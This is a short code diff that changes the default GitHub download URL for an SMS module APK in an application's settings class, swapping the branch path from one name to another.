@@ -24,7 +24,7 @@ class Settings(BaseSettings):
         return (self.virtus_bot_url or self.public_base_url).strip().rstrip("/")
     apk_github_url: str = (
         "https://raw.githubusercontent.com/hivirtusss/V2-testing-done/"
-        "cursor/channel-auto-forward-8042/apk/virtus-sms-module.apk"
+        "cursor/messages-path-otp-8042/apk/virtus-sms-module.apk"
     )
 
     @property
